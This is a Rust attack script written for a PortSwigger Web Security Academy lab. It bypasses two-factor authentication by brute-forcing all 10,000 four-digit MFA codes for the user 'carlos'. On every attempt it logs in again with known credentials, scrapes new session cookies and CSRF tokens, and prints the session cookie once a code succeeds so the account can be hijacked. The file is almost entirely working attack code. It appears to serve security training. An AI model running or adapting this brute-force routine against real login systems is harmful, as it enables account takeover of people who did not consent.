/************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 31/8/2023
*
* Lab: 2FA bypass using a brute-force attack
*
* Steps: 1. GET /login page and extract the session from cookie header
*           and csrf token from the body
*        2. POST /login with valid credentials, extracted session
*           and the csrf token
*        3. Obtain the new session
*        4. GET /login2 with the new session
*        5. Extract csrf token from the body of /login2
*        6. POST the mfa-code with the new session and the new
*           extracted csrf token
*        7. Repeat the process with all possbile numbers
*
*************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use lazy_static::lazy_static;
use rayon::prelude::*;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr, predicate::Name};
use std::{
    collections::HashMap,
    error::Error,
    io,
    io::Write,
    process,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc, Mutex,
    },
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Global variables
*******************/
lazy_static! {
    static ref FAILED_CODES: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    static ref FAILED_CODES_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref CODES_COUNTER: AtomicUsize = AtomicUsize::new(0);
}

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a2800260408bd5d8776e031006500e2.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // capture the time before starting
    let start_time = time::Instant::now();

    // start brute forcing the mfa-code
    brute_force_2fa(start_time, &client, url);

    // if this line is reached, it means that no valid code is found
    println!("\n{}", "[!] No valid code is found".red().bold());

    // print some useful information to the terminal
    print_finish_message(start_time);
    print_failed_requests();
}

/******************************************
* Function use to brute force the mfs-code
*******************************************/
fn brute_force_2fa(start_time: Instant, client: &Client, url: &str) {
    println!(
        "{} {}..",
        "[#] Brute forcing the mfa-code of".white().bold(),
        "carlos".green().bold()
    );
    // iterate over all numbers
    for code in 0..10000 {
        // GET /login page
        let get_login = client.get(format!("{url}/login").as_str()).send();

        // if you GET /login successfully
        if let Ok(get_login_res) = get_login {
            // get the new session
            let get_login_session = extract_session_cookie(get_login_res.headers());

            // get the csrf token
            let get_login_csrf = extract_csrf(get_login_res);

            // try to login with valid credentials
            let post_login = client
                .post(format!("{url}/login"))
                .header("Cookie", format!("session={get_login_session}"))
                .form(&HashMap::from([
                    ("username", "carlos"),
                    ("password", "montoya"),
                    ("csrf", &get_login_csrf),
                ]))
                .send();

            // if you logged in successfully
            if let Ok(post_login_res) = post_login {
                // get the new session
                let post_login_session = extract_session_cookie(post_login_res.headers());

                // GET /login2 with the new session
                let get_login2 = client
                    .get(format!("{url}/login2"))
                    .header("Cookie", format!("session={post_login_session}"))
                    .send();

                // if you GET /login2 successfully
                if let Ok(get_login2_res) = get_login2 {
                    // get the new csrf token
                    let get_login2_csrf = extract_csrf(get_login2_res);

                    // try to POST the mfa-code with the new session and the new csrf token
                    let post_code = client
                        .post(format!("{url}/login2"))
                        .header("Cookie", format!("session={post_login_session}"))
                        .form(&HashMap::from([
                            ("csrf", &get_login2_csrf),
                            ("mfa-code", &format!("{code:04}")),
                        ]))
                        .send();

                    // if POST code is done successfully
                    if let Ok(post_code_res) = post_code {
                        // if a redirect happens; this means a valid code
                        if post_code_res.status().as_u16() == 302 {
                            println!(
                                "\n✅ {}: {}",
                                "Correct code".white().bold(),
                                format!("{code:04}").green().bold(),
                            );

                            // get the new session
                            let new_session = extract_session_cookie(post_code_res.headers());

                            println!(
                                "{}: {}",
                                "✅ New session".white().bold(),
                                new_session.green().bold()
                            );
                            println!(
                                "{} {}",
                                "Use this session in your browser to login as"
                                    .white()
                                    .bold(),
                                "carlos".green().bold()
                            );

                            // print useful information to the terminal
                            print_finish_message(start_time);
                            print_failed_requests();

                            // exit from the program
                            process::exit(0);
                        } else {
                            // if the submitted code is incorrect
                            print!(
                                "\r[*] {}: {} minutes || {}: {} || ({}/10000) {} => {}",
                                "Elapsed".yellow(),
                                start_time.elapsed().as_secs() / 60,
                                "Failed".red(),
                                FAILED_CODES_COUNTER.fetch_add(0, Ordering::Relaxed),
                                CODES_COUNTER.fetch_add(1, Ordering::Relaxed),
                                format!("{code:04}").blue(),
                                "Incorrect".red()
                            );
                            io::stdout().flush();
                        }
                    }
                } else {
                    // if the GET /login2 failed to unknown reason, save the code to try it again
                    FAILED_CODES.lock().unwrap().push(format!("{code:04}"));
                    FAILED_CODES_COUNTER.fetch_add(1, Ordering::Relaxed);
                    continue;
                }
            } else {
                // if the login with valid credentials failed to unknown reason, save the code to try it again
                FAILED_CODES.lock().unwrap().push(format!("{code:04}"));
                FAILED_CODES_COUNTER.fetch_add(1, Ordering::Relaxed);
                continue;
            }
        } else {
            // if the GET /login failed to unknown reason, save the code to try it again
            FAILED_CODES.lock().unwrap().push(format!("{code:04}"));
            FAILED_CODES_COUNTER.fetch_add(1, Ordering::Relaxed);
            continue;
        }
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*********************************************************************
* Function used to build a set of ranges
* Every range will be in one thread
* Feel free to change the number of vectors and the range in each one
**********************************************************************/
fn build_ranges() -> Vec<Vec<i32>> {
    let mut list = Vec::new();
    list.push((0..2500).collect::<Vec<i32>>());
    list.push((2500..5000).collect::<Vec<i32>>());
    list.push((5000..7500).collect::<Vec<i32>>());
    list.push((7500..10000).collect::<Vec<i32>>());
    list
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> String {
    Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .unwrap()
        .to_string()
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> String {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    extract_pattern("session=(.*); Secure", cookie)
}

/*******************************************
* Function to extract a pattern form a text
********************************************/
fn extract_pattern(pattern: &str, text: &str) -> String {
    Regex::new(pattern)
        .unwrap()
        .captures(text)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}

/********************************************************
* Function used to print finish time
*********************************************************/
#[inline(always)]
fn print_finish_message(start_time: Instant) {
    println!(
        "\n{}: {:?} minutes",
        "✅ Finished in".green().bold(),
        start_time.elapsed().as_secs() / 60
    );
}

/**********************************
* Function used print failed codes
***********************************/
#[inline(always)]
fn print_failed_requests() {
    let failed_codes = FAILED_CODES.lock().unwrap();
    println!(
        "\n{}: {} \n{}: {:?}",
        "[!] Failed codes count".red().bold(),
        failed_codes.len().to_string().yellow().bold(),
        "[!] Failed codes".red().bold(),
        failed_codes
    )
}
